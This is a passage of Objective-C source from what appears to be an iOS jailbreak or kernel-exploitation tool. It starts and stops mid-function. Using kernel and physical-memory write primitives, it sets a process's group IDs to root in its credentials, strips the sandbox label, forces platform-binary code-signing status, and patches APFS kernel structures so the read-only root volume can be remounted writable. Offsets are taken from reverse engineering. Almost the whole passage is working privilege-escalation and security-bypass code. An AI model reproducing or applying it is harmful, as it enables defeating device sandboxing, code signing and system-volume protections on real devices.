    dt_mirror_532c68_t m_proc_find = dt_mirror_532C68(proc_find_proc);
    dt_mirror_532c68_t m_ctx_proc = dt_mirror_532C68(ctx_proc);
    dt_mirror_532c68_t m_ctx_ucred = dt_mirror_532C68(ctx_ucred);

    bool ctx_ucred_eq_proc_find_ucred = m_proc_find.cred && ctx_ucred && m_proc_find.cred == ctx_ucred;

    uint64_t proc_find_saved = proc_find_proc;
    proc_rele(proc_find_proc);

    dt_b100_phys_log(log, @"[*] build101 ctx proof begin");
    dt_b100_phys_log(log, @"pid=%d", (int)pid);
    dt_b100_phys_log(log, @"thread_port=0x%x", (unsigned)thread_port);
    dt_b100_phys_log(log, @"task_kptr_proc=0x%llx task_kptr_pmap=0x%llx task_kptr_used=0x%llx task_proc_eq_pmap=%d",
        (unsigned long long)task_from_proc,
        (unsigned long long)th_diag.task_pmap,
        (unsigned long long)task_kptr,
        task_proc_eq_pmap ? 1 : 0);
    dt_b100_phys_log(log, @"thread_resolve itk_space_off=0x%x itk_space=0x%llx ipc_entry=0x%llx port_obj=0x%llx kobject_off=0x%x",
        th_diag.itk_space_off,
        (unsigned long long)th_diag.itk_space_kptr,
        (unsigned long long)th_diag.ipc_entry,
        (unsigned long long)th_diag.port_obj,
        th_diag.kobject_off);
    dt_b100_phys_log(log, @"thread_kptr=0x%llx", (unsigned long long)thread_kptr);
    dt_b100_phys_log(log, @"ctx=0x%llx", (unsigned long long)ctx);
    dt_b100_phys_log(log, @"ctx_ucred_0x8=0x%llx", (unsigned long long)ctx_ucred);
    dt_b100_phys_log(log, @"ctx_proc_0x10=0x%llx", (unsigned long long)ctx_proc);
    dt_b100_phys_log(log, @"ctx_task_0x20=0x%llx", (unsigned long long)ctx_task);
    dt_b100_phys_log(log, @"ctx_thread_back_0x0=0x%llx ctx_back_eq_thread=%d",
        (unsigned long long)ctx_thread_back, ctx_back_eq_thread ? 1 : 0);
    dt_b100_phys_log(log, @"ctx_task_eq_task=%d", ctx_task_eq_task ? 1 : 0);

    dt_b100_phys_log(log, @"proc_find_proc=0x%llx", (unsigned long long)proc_find_saved);
    dt_b100_phys_log(log, @"pmap_cache_proc=0x%llx",
        (unsigned long long)(pmap.proc_cached ? pmap.proc : 0));
    dt_b100_phys_log(log, @"proc_find_eq_ctx_proc=%d", proc_find_eq_ctx_proc ? 1 : 0);
    dt_b100_phys_log(log, @"proc_find_eq_ctx_ucred=%d", proc_find_eq_ctx_ucred ? 1 : 0);
    dt_b100_phys_log(log, @"ctx_ucred_eq_proc_find_ucred=%d", ctx_ucred_eq_proc_find_ucred ? 1 : 0);

    dt_b100_phys_log(log, @"proc_find.proc_ro=0x%llx", (unsigned long long)m_proc_find.proc_ro);
    dt_b100_phys_log(log, @"proc_find.ucred=0x%llx", (unsigned long long)m_proc_find.cred);
    dt_b100_phys_log(log, @"proc_find.label=0x%llx", (unsigned long long)m_proc_find.label);
    dt_b100_phys_log(log, @"proc_find.slot0=0x%llx", (unsigned long long)m_proc_find.slot0_raw);
    dt_b100_phys_log(log, @"proc_find.slot1=0x%llx", (unsigned long long)m_proc_find.slot1_raw);

    dt_b100_phys_log(log, @"mirror532C68(proc_find): result=0x%llx exit=%c",
        (unsigned long long)m_proc_find.profile, m_proc_find.exit_code);
    dt_b100_phys_log(log, @"mirror532C68(ctx_proc): result=0x%llx exit=%c",
        (unsigned long long)m_ctx_proc.profile, m_ctx_proc.exit_code);
    dt_b100_phys_log(log, @"mirror532C68(ctx_ucred_as_proc): result=0x%llx exit=%c",
        (unsigned long long)m_ctx_ucred.profile, m_ctx_ucred.exit_code);

    /* build99-style one-line grep (§28.8) */
    [[DTRunLogger shared] log:
        [NSString stringWithFormat:
            @"[*] build101 chain pre-consume pid=%d thread_kptr=0x%llx ctx=0x%llx "
            @"ctx_ucred_0x8=0x%llx ctx_proc_0x10=0x%llx proc_find_proc=0x%llx "
            @"proc_find_eq_ctx_proc=%d proc_find_eq_ctx_ucred=%d ctx_ucred_eq_proc_ucred=%d "
            @"mirror_find=%c mirror_ctx=%c mirror_bad=%c itk_off=0x%x itk=0x%llx",
            (int)pid,
            (unsigned long long)thread_kptr,
            (unsigned long long)ctx,
            (unsigned long long)ctx_ucred,
            (unsigned long long)ctx_proc,
            (unsigned long long)proc_find_saved,
            proc_find_eq_ctx_proc ? 1 : 0,
            proc_find_eq_ctx_ucred ? 1 : 0,
            ctx_ucred_eq_proc_find_ucred ? 1 : 0,
            m_proc_find.exit_code, m_ctx_proc.exit_code, m_ctx_ucred.exit_code,
            th_diag.itk_space_off, (unsigned long long)th_diag.itk_space_kptr]];

    dt_b100_phys_log(log,
        @"[*] build101 IDA offsets: thread+0x%x ctx+0x%x ucred ctx+0x%x proc ctx+0x%x task "
        @"task+0x%x itk_space ipc_port+0x%x kobject",
        kDTB100ThreadVfsCtxOff, kDTB100CtxUcredOff, kDTB100CtxProcOff, kDTB100CtxTaskOff,
        th_diag.itk_space_off, th_diag.kobject_off);

    [[DTRunLogger shared] logStage:
        [NSString stringWithFormat:
            @"build101 ctx proof pid=%d thread=0x%llx ctx=0x%llx ucred=0x%llx proc=0x%llx "
            @"eq_proc=%d eq_ucred=%d m_find=%c m_ctx=%c m_bad=%c",
            (int)pid,
            (unsigned long long)thread_kptr,
            (unsigned long long)ctx,
            (unsigned long long)ctx_ucred,
            (unsigned long long)ctx_proc,
            proc_find_eq_ctx_proc ? 1 : 0,
            proc_find_eq_ctx_ucred ? 1 : 0,
            m_proc_find.exit_code, m_ctx_proc.exit_code, m_ctx_ucred.exit_code]];

    if (!thread_kptr || !ctx) {
        dt_b100_phys_log(log, @"[!] build101 ctx proof thread/ctx resolution failed "
            @"(task=0x%llx itk_off=0x%x itk=0x%llx entry=0x%llx port_obj=0x%llx)",
            (unsigned long long)task_kptr, th_diag.itk_space_off,
            (unsigned long long)th_diag.itk_space_kptr,
            (unsigned long long)th_diag.ipc_entry,
            (unsigned long long)th_diag.port_obj);
        [[DTRunLogger shared] logStage:@"build101 ctx proof fail thread ctx"];
        return -3;
    }

    dt_b100_phys_log(log, @"[*] build101 ctx proof end");
    return 0;
}

static int dt_build_privesc_smoke_internal(uint64_t proc, bool preserve_slot0, void (^log)(NSString *line))
{
    if (!proc) {
        [[DTRunLogger shared] logStage:@"build27 failed no proc"];
        return -1;
    }
    if (dt_phys_cred_require_ready(log) != 0) {
        [[DTRunLogger shared] logStage:@"build27 failed no phys"];
        return -2;
    }
    if (getuid() != 0) {
        [[DTRunLogger shared] logStage:@"build27 failed need root"];
        return -3;
    }
    if (!gSystemInfo.kernelStruct.proc_ro.exists) {
        [[DTRunLogger shared] logStage:@"build27 failed proc_ro layout"];
        return -4;
    }

    uint64_t ucred = proc_ucred(proc);
    if (!ucred) {
        [[DTRunLogger shared] logStage:@"build27 failed ucred"];
        return -5;
    }

    if (getgid() != 0) {
        [[DTRunLogger shared] logStage:@"build27 patch gid"];
        kwrite32(proc + koffsetof(proc, svgid), 0);
        kwrite32(ucred + koffsetof(ucred, rgid), 0);
        kwrite32(ucred + koffsetof(ucred, svgid), 0);
        kwrite32(ucred + koffsetof(ucred, groups), 0);
        if (getgid() != 0) {
            [[DTRunLogger shared] logStage:@"build27 failed gid"];
            DTPhysLog(log, @"[!] build27 getgid=%u after patch", (unsigned)getgid());
            return -6;
        }
    }
    [[DTRunLogger shared] logStage:@"build27 gid 0"];

    uint32_t pflag = kread32(proc + koffsetof(proc, flag));
    if (pflag & P_SUGID) {
        kwrite32(proc + koffsetof(proc, flag), pflag & ~P_SUGID);
    }

    uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));
    if (!label) {
        [[DTRunLogger shared] logStage:@"build27 failed cr_label"];
        return -7;
    }
    dt_build89_log_label_slots("before unsandbox", label, log);
    if (preserve_slot0) {
        DTPhysLog(log, @"[*] build97 privesc slot0 preserved (Option A §36.2 — no mac_label_set -1)");
        [[DTRunLogger shared] logStage:@"build97 slot0 preserved"];
        uint64_t slot0 = mac_label_get(label, 0);
        DTPhysLog(log, @"[*] build97 slot0 at privesc=0x%llx (need non-NULL for 55106C consume)",
                  (unsigned long long)slot0);
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build97 slot0=0x%llx", (unsigned long long)slot0]];
    } else {
        mac_label_set(label, 0, (uint64_t)-1LL);
        dt_build89_log_label_slots("after unsandbox slot0", label, log);
    }

    NSError *var_err = nil;
    NSArray *var_list = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&var_err];
    if (!var_list || var_err) {
        if (preserve_slot0) {
            DTPhysLog(log, @"[*] build97 /var list skipped (slot0 preserved): %@",
                      var_err.localizedDescription ?: @"nil");
            [[DTRunLogger shared] logStage:@"build97 /var list skip slot0 preserved"];
            var_list = @[];
        } else {
            [[DTRunLogger shared] logStage:@"build27 failed unsandbox"];
            DTPhysLog(log, @"[!] build27 /var: %@", var_err.localizedDescription ?: @"nil");
            return -8;
        }
    }
    setenv("HOME", "/var/root", 1);
    setenv("CFFIXED_USER_HOME", "/var/root", 1);
    setenv("TMPDIR", "/var/tmp", 1);
    if (!preserve_slot0) {
        [[DTRunLogger shared] logStage:@"build89 unsandbox slot0 OK"];
        [[DTRunLogger shared] logStage:@"build27 unsandbox OK"];
    }

    uint32_t cs_before = proc_getcsflags(proc);
    proc_csflags_set(proc, CS_PLATFORM_BINARY);
    uint32_t cs_kernel = proc_getcsflags(proc);

    uint32_t cs_userspace = 0;
    if (csops(getpid(), CS_OPS_STATUS, &cs_userspace, sizeof(cs_userspace)) != 0) {
        [[DTRunLogger shared] logStage:@"build27 failed csops"];
        return -9;
    }
    if (!(cs_userspace & CS_PLATFORM_BINARY)) {
        [[DTRunLogger shared] logStage:@"build27 failed platformize"];
        DTPhysLog(log, @"[!] build27 csflags kernel=0x%x->0x%x userspace=0x%x",
            cs_before, cs_kernel, cs_userspace);
        return -10;
    }
    [[DTRunLogger shared] logStage:@"build27 platformize OK"];
    [[DTRunLogger shared] logStage:@"build27 privesc OK"];
    DTPhysLog(log, @"[+] build27 uid=%u gid=%u cs=0x%x /var entries=%lu",
        (unsigned)getuid(), (unsigned)getgid(), cs_userspace, (unsigned long)var_list.count);
    return 0;
}

int dt_build_privesc_smoke(uint64_t proc, void (^log)(NSString *line))
{
    return dt_build_privesc_smoke_internal(proc, false, log);
}

int dt_build97_privesc_preserve_slot0(uint64_t proc, void (^log)(NSString *line))
{
    return dt_build_privesc_smoke_internal(proc, true, log);
}

struct dt_hfs_mount_args {
    char *fspec;
    uid_t hfs_uid;
    gid_t hfs_gid;
    mode_t hfs_mask;
};

enum {
    DT_APFS_MOUNT_FILESYSTEM = 1,
};

/// Userland mount(2) data (kernel copyin 0x144 @ apfs_vfsop_mount 0x9da040 → kaddr).
/// Step8: mount(..., MNT_UPDATE, &args) — vfs_isupdate @ 0x9da238 selects the update path
/// ("updating mounted" @ 0x9da540 → apfs_mount_update @ 0x9da970). Jumptable LDRH at mount-args
/// +0 @ 0x9da2e4 runs only when vfs_isupdate is false. fspec / apfs_flags are not read on the
/// MNT_UPDATE path before apfs_mount_update (kernel overwrites kaddr+0 from var_8F0 @ 0x9da964).
struct dt_apfs_mount_args {
    char *fspec;
    uint64_t apfs_flags;
    uint32_t mount_mode;
    uint32_t pad1;
    uint32_t unk_flags;
    char snapshot[256];
    void *im4p_ptr;
    uint32_t im4p_size;
    uint32_t pad2;
    void *im4m_ptr;
    uint32_t im4m_size;
    uint32_t im_4cc;
    uint32_t cryptex_type;
    int32_t auth_mode;
    uid_t uid;
    gid_t gid;
} __attribute__((packed, aligned(4)));

static int dt_phys_write64_va(uint64_t va, uint64_t val, const char *tag, void (^log)(NSString *line))
{
    uint64_t pa = kvtophys(va);
    if (!pa) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build37 kvtophys %s failed", tag]];
        return -4;
    }
    if (physwrite64(pa, val) != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build37 physwrite %s failed", tag]];
        return -5;
    }

    uint64_t after_kread = kread64(va);
    uint64_t after_phys = physread64(pa);
    if (after_kread != val || after_phys != val) {
        DTPhysLog(log, @"[!] build37 verify %s kread=0x%llx phys=0x%llx want=0x%llx",
            tag, after_kread, after_phys, val);
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build37 verify %s failed", tag]];
        return -6;
    }
    return 0;
}

/// Kernel pointer: static image (0xfffffff0…) or kalloc heap (0xffffffe0…). Rejects user/fault addrs.
static bool dt_build36_kern_kptr_valid(uint64_t p, uint64_t exclude)
{
    if (!p || p == exclude)
        return false;
    if ((p & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
        return false;
    if (p < 0xFFFFFE0000000000ULL)
        return false;
    if ((p & 0x7) != 0)
        return false;
    return true;
}

typedef struct {
    uint64_t rootvnode_slot;
    uint64_t root_vp;
    uint64_t mount_mp;
    uint64_t apfs;
    uint64_t apfs_main;
    uint64_t apfs_eff;
    uint64_t container;
} dt_build38_chain_t;

static const char *dt_build38_kptr_class(uint64_t p)
{
    if (!dt_build36_kern_kptr_valid(p, 0))
        return "invalid";
    if ((p >> 32) == 0xfffffff0ULL)
        return "static";
    return "heap";
}

static uint64_t dt_build38_read_u64_dual(uint64_t va, const char *tag, void (^log)(NSString *line))
{
    uint64_t kr = kread64(va);
    uint64_t pr = 0;
    if (gPrimitives.vtophys) {
        uint64_t pa = kvtophys(va);
        if (pa)
            pr = physread64(pa);
    }
    if (kr != pr && log && tag) {
        DTPhysLog(log, @"[*] build38 dual %s va=0x%llx kread=0x%llx phys=0x%llx",
            tag, va, kr, pr);
    }
    if (dt_build36_kern_kptr_valid(pr, 0))
        return pr;
    if (dt_build36_kern_kptr_valid(kr, 0))
        return kr;
    return kr ? kr : pr;
}

static uint32_t dt_build38_read_u32_dual(uint64_t va, const char *tag, void (^log)(NSString *line))
{
    uint32_t kr = kread32(va);
    if (!gPrimitives.vtophys)
        return kr;
    uint64_t pa = kvtophys(va);
    if (!pa)
        return kr;
    uint32_t pr = physread32(pa);
    if (kr != pr && log && tag)
        DTPhysLog(log, @"[*] build38 dual %s va=0x%llx kread=0x%x phys=0x%x", tag, va, kr, pr);
    return pr;
}

/// IDA: f_mntfromname built as com.apple.os.update-<hash>@/dev/... in handle_snapshot_mount @ 0x9dfc30.
static bool dt_build59_root_os_update_graft(void)
{
    struct statfs fs;
    if (statfs("/", &fs) != 0)
        return false;
    return strstr(fs.f_mntfromname, "com.apple.os.update-") != NULL;
}

/// IDA apfs_vfsop_mount MNT_UPDATE → apfs_mount_update BL @ 0x9da970 (vfs_fsprivate in X20).
/// handle_snapshot_mount @ 0x9dfc30: child+0x138 = outer (back-link); logs also show outer+0x138 → snap child.
/// On os.update boots outer+0xC0 may be static (not heap); child may have heap vol_sb — build64 link-fix copies
/// child vol_sb → outer+0xC0 after child q48 probe (IDA @ 0xa273a8). Do not patch child apfs alone for step7.
static uint64_t dt_build38_apfs_eff(uint64_t apfs, uint64_t *out_main, void (^log)(NSString *line))
{
    uint64_t main_apfs = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_MAIN_APFS, "apfs+0x138", log);
    if (out_main)
        *out_main = main_apfs;

    if (dt_build59_root_os_update_graft()) {
        DTPhysLog(log,
            @"[*] build62 os.update: mount_apfs=outer 0x%llx (IDA case5 @ 0x9da970) snap_child=0x%llx(%s)",
            apfs, main_apfs, dt_build38_kptr_class(main_apfs));
        [[DTRunLogger shared] logStage:@"build62 os.update outer mount_apfs"];
        return apfs;
    }

    return dt_build36_kern_kptr_valid(main_apfs, 0) ? main_apfs : apfs;
}

static void dt_build38_nxsb_probe(uint64_t ptr, const char *label, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(ptr, 0))
        return;
    uint32_t magic = dt_build38_read_u32_dual(ptr, label, log);
    if (magic != (uint32_t)DT_BAKED_APFS_VOL_SB_MAGIC) {
        char off32_tag[64];
        snprintf(off32_tag, sizeof(off32_tag), "%s+0x20", label);
        uint32_t magic32 = dt_build38_read_u32_dual(ptr + DT_BAKED_NXSB_BUF_MAGIC_OFF, off32_tag, log);
        if (magic32 != (uint32_t)DT_BAKED_APFS_VOL_SB_MAGIC)
            return;
        DTPhysLog(log, @"[*] build38 NXSB? %s ptr=0x%llx magic@+32=0x%x", label, ptr, magic32);
        DTPhysLog(log, @"[*] build38 NXSB %s +48=0x%llx +56=0x%02x +160=0x%llx +168=0x%llx",
            label,
            dt_build38_read_u64_dual(ptr + DT_BAKED_APFS_VOL_QWORD48, "nxsb+48", log),
            (unsigned)(dt_build38_read_u32_dual(ptr + DT_BAKED_APFS_VOL_BYTE56, "nxsb+56", log) & 0xFFu),
            dt_build38_read_u64_dual(ptr + DT_BAKED_APFS_VOL_SB_REVERT160, "nxsb+160", log),
            dt_build38_read_u64_dual(ptr + DT_BAKED_APFS_VOL_SB_REVERT168, "nxsb+168", log));
        return;
    }
    DTPhysLog(log, @"[*] build38 NXSB? %s ptr=0x%llx magic@+0=0x%x", label, ptr, magic);
    DTPhysLog(log, @"[*] build38 NXSB %s +48=0x%llx +56=0x%02x +160=0x%llx +168=0x%llx",
        label,
        dt_build38_read_u64_dual(ptr + DT_BAKED_APFS_VOL_QWORD48, "nxsb+48", log),
        (unsigned)(dt_build38_read_u32_dual(ptr + DT_BAKED_APFS_VOL_BYTE56, "nxsb+56", log) & 0xFFu),
        dt_build38_read_u64_dual(ptr + DT_BAKED_APFS_VOL_SB_REVERT160, "nxsb+160", log),
        dt_build38_read_u64_dual(ptr + DT_BAKED_APFS_VOL_SB_REVERT168, "nxsb+168", log));
}

static void dt_build38_log_apfs_fields(uint64_t apfs, const char *tag, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(apfs, 0)) {
        DTPhysLog(log, @"[!] build38 %s apfs=0x%llx invalid", tag, apfs);
        return;
    }
    uint64_t vol_sb = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_VOL_SB, "vol_sb", log);
    uint64_t child_vol_sb = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_CHILD_VOL_SB, "child_vol_sb", log);
    uint64_t backup = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_BACKUP_VOL_SB, "backup+0xC8", log);
    uint64_t container = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_CONTAINER, "container", log);
    uint64_t revert_xid = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_REVERT_XID, "revert_xid", log);
    uint64_t main_ptr = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_MAIN_APFS, "apfs_main", log);
    uint32_t substate = dt_build38_read_u32_dual(apfs + DT_BAKED_APFS_MOUNT_SUBSTATE, "mount_substate", log);
    uint32_t apfs_ro = dt_build38_read_u32_dual(apfs + DT_BAKED_APFS_READONLY, "apfs_readonly", log);
    uint64_t vol_id = dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_VOL_ID, "vol_id", log);

    DTPhysLog(log,
        @"[*] build38 %s apfs=0x%llx class=%s +0xC0=0x%llx +0xD8=0x%llx +0xC8=0x%llx +0xD0=0x%llx +0xF8=0x%llx",
        tag, apfs, dt_build38_kptr_class(apfs), vol_sb, child_vol_sb, backup, container, revert_xid);
    DTPhysLog(log,
        @"[*] build38 %s +0x138=0x%llx(%s) +0x148=0x%x +0x2B4=%u +0x2D8=0x%llx",
        tag, main_ptr, dt_build38_kptr_class(main_ptr), substate, apfs_ro, vol_id);

    char tag_c0[64], tag_c8[64];
    snprintf(tag_c0, sizeof(tag_c0), "%s+0xC0", tag);
    snprintf(tag_c8, sizeof(tag_c8), "%s+0xC8", tag);
    dt_build38_nxsb_probe(vol_sb, tag_c0, log);
    dt_build38_nxsb_probe(backup, tag_c8, log);
}

static void dt_build38_container_dump(uint64_t container, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(container, 0)) {
        DTPhysLog(log, @"[*] build38 container null/invalid — skip container dump");
        return;
    }

    uint32_t word0 = dt_build38_read_u32_dual(container, "container+0", log);
    uint64_t nx_sb = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_NX_SB, "container+0xC0", log);
    uint32_t mu_gate = dt_build38_read_u32_dual(container + DT_BAKED_CONTAINER_MU_GATE, "container+0x13C", log);
    uint32_t remap = dt_build38_read_u32_dual(container + DT_BAKED_CONTAINER_REMAP, "container+0x144", log);
    uint64_t vol_head = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_VOL_LIST, "container+0x1F0", log);

    DTPhysLog(log,
        @"[*] build38 container=0x%llx +0=0x%x +0xC0=0x%llx +0x13C=%u +0x144=%u +0x1F0=0x%llx",
        container, word0, nx_sb, mu_gate, remap, vol_head);

    dt_build38_nxsb_probe(nx_sb, "container+0xC0", log);

    uint64_t entry = vol_head;
    for (unsigned i = 0; i < 8 && dt_build36_kern_kptr_valid(entry, 0); i++) {
        char tag[32];
        snprintf(tag, sizeof(tag), "vollist[%u]", i);
        DTPhysLog(log, @"[*] build38 %s apfs=0x%llx", tag, entry);
        dt_build38_log_apfs_fields(entry, tag, log);
        char nx_tag[64];
        snprintf(nx_tag, sizeof(nx_tag), "%s+0xC0", tag);
        dt_build38_nxsb_probe(dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_SB, "list+0xC0", log), nx_tag, log);
        entry = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_LIST_NEXT, "list+0x330", log);
    }
}

static int dt_build38_resolve_chain(dt_build38_chain_t *chain, void (^log)(NSString *line))
{
    memset(chain, 0, sizeof(*chain));
    const dt_misaka_offsets_t *o = &g_misaka_offsets;

    chain->rootvnode_slot = gSystemInfo.kernelConstant.slide + DT_BAKED_ROOTVNODE_UNSLID;
    chain->root_vp = dt_build38_read_u64_dual(chain->rootvnode_slot, "rootvnode", log);
    if (!dt_build36_kern_kptr_valid(chain->root_vp, chain->rootvnode_slot)) {
        DTPhysLog(log, @"[!] build38 rootvnode slot=0x%llx vp=0x%llx invalid",
            chain->rootvnode_slot, chain->root_vp);
        return -2;
    }

    chain->mount_mp = dt_build38_read_u64_dual(chain->root_vp + o->off_vnode_v_mount, "v_mount", log);
    if (!dt_build36_kern_kptr_valid(chain->mount_mp, 0)) {
        DTPhysLog(log, @"[!] build38 root_vp=0x%llx mount=0x%llx invalid", chain->root_vp, chain->mount_mp);
        return -3;
    }

    chain->apfs = dt_build38_read_u64_dual(chain->mount_mp + DT_BAKED_MOUNT_FSPRIVATE, "mnt_data+0x8F8", log);
    if (!dt_build36_kern_kptr_valid(chain->apfs, 0)) {
        DTPhysLog(log, @"[!] build38 mount=0x%llx apfs=0x%llx invalid", chain->mount_mp, chain->apfs);
        return -5;
    }

    chain->apfs_eff = dt_build38_apfs_eff(chain->apfs, &chain->apfs_main, log);
    /* IDA apfs_mount_update @ 0xa27338: LDR X9,[apfs,#0xD0] on apfs_eff (device: outer+0xD0 is null). */
    chain->container = dt_build38_read_u64_dual(chain->apfs_eff + DT_BAKED_APFS_CONTAINER, "eff+0xD0", log);
    return 0;
}

static void dt_build38_statfs_log(const char *path, void (^log)(NSString *line))
{
    struct statfs fs;
    if (statfs(path, &fs) != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build38 statfs %s errno=%d", path, errno]];
        return;
    }
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:
        @"build38 statfs %s %s flags=0x%x fstype=%s from=%s",
        path, (fs.f_flags & MNT_RDONLY) ? "RDONLY" : "RW", fs.f_flags, fs.f_fstypename, fs.f_mntfromname]];
}

static int dt_build38_apfs_discovery(void (^log)(NSString *line))
{
    if (!gPrimitives.physreadbuf || !gPrimitives.vtophys) {
        [[DTRunLogger shared] logStage:@"build38 physread missing"];
        return -1;
    }

    dt_build38_chain_t chain = {0};
    int cr = dt_build38_resolve_chain(&chain, log);
    if (cr != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build38 chain fail %d", cr]];
        return cr;
    }

    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    uint32_t mnt_flag = dt_build38_read_u32_dual(chain.mount_mp + o->off_mount_mnt_flag, "mnt_flag", log);
    uint32_t mnt_kern = dt_build38_read_u32_dual(chain.mount_mp + o->off_mount_mnt_flag + 4, "mnt_kern", log);
    uint64_t root_fsnode = dt_build38_read_u64_dual(chain.root_vp + o->off_vnode_v_data, "root_fsnode", log);
    uint8_t fsnode157 = 0;
    if (dt_build36_kern_kptr_valid(root_fsnode, 0))
        fsnode157 = (uint8_t)(dt_build38_read_u32_dual(root_fsnode + DT_BAKED_APFS_FSNODE_RO_GATE, "fsnode+157", log) & 0xFFu);

    DTPhysLog(log,
        @"[*] build38 chain rootvnode=0x%llx root_vp=0x%llx mount=0x%llx apfs=0x%llx mnt_flag=0x%x mnt_kern=0x%x",
        chain.rootvnode_slot, chain.root_vp, chain.mount_mp, chain.apfs, mnt_flag, mnt_kern);
    DTPhysLog(log,
        @"[*] build38 apfs_main=0x%llx(%s) apfs_eff=0x%llx eff_is_main=%d container=0x%llx(%s)",
        chain.apfs_main, dt_build38_kptr_class(chain.apfs_main),
        chain.apfs_eff, chain.apfs_eff != chain.apfs ? 1 : 0, chain.container,
        dt_build38_kptr_class(chain.container));
    DTPhysLog(log, @"[*] build38 root_fsnode=0x%llx fsnode+157=0x%02x (mask 0x%02x)",
        root_fsnode, fsnode157, DT_BAKED_APFS_FSNODE_RO_MASK);

    [[DTRunLogger shared] logStage:@"build38 outer apfs"];
    dt_build38_log_apfs_fields(chain.apfs, "outer", log);

    if (chain.apfs_eff != chain.apfs) {
        [[DTRunLogger shared] logStage:@"build38 apfs_eff"];
        dt_build38_log_apfs_fields(chain.apfs_eff, "eff", log);
    }

    if (dt_build36_kern_kptr_valid(chain.apfs_main, 0) && chain.apfs_main != chain.apfs_eff) {
        [[DTRunLogger shared] logStage:@"build38 apfs_main"];
        dt_build38_log_apfs_fields(chain.apfs_main, "main", log);
    }

    [[DTRunLogger shared] logStage:@"build38 container"];
    dt_build38_container_dump(chain.container, log);

    [[DTRunLogger shared] logStage:@"build38 discovery OK"];
    DTPhysLog(log, @"[+] build38 discovery complete — no patches applied");
    return 0;
}

/// Build 40 patch helpers — reused by build47 staged remount.
static int dt_build40_patch_apfs_readonly(uint64_t apfs_eff, void (^log)(NSString *line))
{
    uint32_t apfs_ro = dt_build38_read_u32_dual(apfs_eff + DT_BAKED_APFS_READONLY, "eff+0x2B4-pre", log);
    if (apfs_ro == 0) {
        [[DTRunLogger shared] logStage:@"build40 step2 apfs_readonly already clear"];
        return 0;
    }

    DTPhysLog(log, @"[*] build40 step2 eff+0x2B4 apfs_readonly %u → 0", apfs_ro);
    int patch_err = dt_phys_write32_va(apfs_eff + DT_BAKED_APFS_READONLY, 0, "build40 eff+0x2B4", log);
    if (patch_err != 0)
        return patch_err;

    if (dt_build38_read_u32_dual(apfs_eff + DT_BAKED_APFS_READONLY, "eff+0x2B4-post", log) != 0) {
        [[DTRunLogger shared] logStage:@"build40 step2 apfs_readonly still set"];
        return -3;
    }
    [[DTRunLogger shared] logStage:@"build40 step2 apfs_readonly OK"];
    return 0;
}

static int dt_build40_patch_revert_xid(uint64_t apfs_eff, void (^log)(NSString *line))
{
    uint64_t revert_xid = dt_build38_read_u64_dual(apfs_eff + DT_BAKED_APFS_REVERT_XID, "eff+0xF8-pre", log);
    if (revert_xid == 0) {
        [[DTRunLogger shared] logStage:@"build40 step3 revert_xid already clear"];
        return 0;
    }

    DTPhysLog(log, @"[*] build40 step3 eff+0xF8 revert_xid 0x%llx → 0", revert_xid);
    int patch_err = dt_phys_write64_va(apfs_eff + DT_BAKED_APFS_REVERT_XID, 0, "build40 eff+0xF8", log);
    if (patch_err != 0)
        return patch_err;

    if (dt_build38_read_u64_dual(apfs_eff + DT_BAKED_APFS_REVERT_XID, "eff+0xF8-post", log) != 0) {
        [[DTRunLogger shared] logStage:@"build40 step3 revert_xid still set"];
        return -4;
    }
    [[DTRunLogger shared] logStage:@"build40 step3 revert_xid OK"];
    return 0;
}

/// IDA apfs_mount_update @ 0xfffffff006a2733c: LDR W8,[container,#0x13C]; CBZ → STR 1,[apfs,#0x2B4]; RET.
/// Device build40 run2: container+0x13C=1 while / write still EROFS after steps 1–3.
static int dt_build41_patch_container_mu_gate(uint64_t container, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(container, 0)) {
        [[DTRunLogger shared] logStage:@"build41 step4 container invalid — skip"];
        return 0;
    }

    uint32_t mu_gate = dt_build38_read_u32_dual(container + DT_BAKED_CONTAINER_MU_GATE, "container+0x13C-pre", log);
    if (mu_gate == 0) {
        [[DTRunLogger shared] logStage:@"build41 step4 container+0x13C already clear"];
        return 0;
    }

    DTPhysLog(log, @"[*] build41 step4 container+0x13C mu_gate %u → 0", mu_gate);
    int patch_err = dt_phys_write32_va(container + DT_BAKED_CONTAINER_MU_GATE, 0, "build41 container+0x13C", log);
    if (patch_err != 0)
        return patch_err;

    if (dt_build38_read_u32_dual(container + DT_BAKED_CONTAINER_MU_GATE, "container+0x13C-post", log) != 0) {
        [[DTRunLogger shared] logStage:@"build41 step4 container+0x13C still set"];
        return -9;
    }
    [[DTRunLogger shared] logStage:@"build41 step4 container+0x13C OK"];
    return 0;
}

/// IDA nx_rw_update @ 0xfffffff006987904 and @ 0xfffffff006987978: container+0xC8 → nxsb; @ 0x987908: nxsb+0x4F4.
static void dt_build42_nx_layer_probe(uint64_t container, const char *tag, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(container, 0)) {
        DTPhysLog(log, @"[*] build42 %s container invalid — skip nx layer", tag);
        return;
    }

